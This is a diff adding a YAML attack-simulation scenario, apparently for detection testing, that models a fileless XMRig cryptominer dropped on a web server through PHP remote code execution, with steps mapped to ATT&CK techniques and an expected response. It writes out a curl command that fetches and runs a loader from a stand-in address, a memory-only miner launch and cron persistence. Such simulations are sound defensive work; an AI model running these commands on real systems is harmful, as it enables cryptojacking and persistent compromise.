@@ -1,0 +1,21 @@
+name: fileless_cryptominer
+title: "Fileless cryptominer dropped through a vulnerable PHP app"
+description: >
+  Opportunistic attack on web-02: remote code execution in PHP pulls a loader, which uses
+  memfd_create() to run an XMRig miner purely from memory and connects to a mining pool on a
+  non-standard port. Expected response: kill the whole process tree and block the pool IP.
+steps:
+  - {id: sh, name: "RCE spawns shell", host: web-02, action: exec, parent: "@php-fpm", binary: /bin/sh,
+     args: "-c curl -s http://198.51.100.23/m.sh -o /dev/shm/m.sh; sh /dev/shm/m.sh", uid: 33, technique: T1505.003, delay: 2}
+  - {id: c, name: "Download loader to /dev/shm", host: web-02, action: exec, parent: sh, binary: /usr/bin/curl,
+     args: "-s http://198.51.100.23/m.sh -o /dev/shm/m.sh", uid: 33, technique: T1105, delay: 1}
+  - {name: "Loader download connection", host: web-02, action: connect, proc: c, dst_ip: 198.51.100.23, dport: 80, delay: 0.3}
+  - {id: stage, name: "Run loader", host: web-02, action: exec, parent: sh, binary: /bin/sh, args: "/dev/shm/m.sh", uid: 33, delay: 1}
+  - {id: py, name: "Python memfd loader", host: web-02, action: exec, parent: stage, binary: /usr/bin/python3,
+     args: "-c import os;fd=os.memfd_create('kswapd0')", uid: 33, delay: 1}
+  - {name: "memfd_create('kswapd0')", host: web-02, action: memfd, proc: py, name: kswapd0, technique: T1620, delay: 0.3}
+  - {id: miner, name: "XMRig executed from memory", host: web-02, action: exec, parent: py, binary: /proc/self/fd/3,
+     args: "-o stratum+tcp://198.51.100.23:3333 -k --donate-level 1", uid: 33, technique: T1496, delay: 0.3}
+  - {name: "Mining pool connection :3333", host: web-02, action: connect, proc: miner, dst_ip: 198.51.100.23, dport: 3333, technique: T1571, delay: 1}
+  - {name: "Cron persistence", host: web-02, action: exec, parent: stage, binary: /usr/bin/crontab, args: "/dev/shm/c", uid: 33, exit: true, technique: T1053.003, delay: 1}
+  - {name: "Second pool connection attempt", host: web-02, action: connect, proc: stage, dst_ip: 198.51.100.23, dport: 3333, technique: T1571, delay: 2}
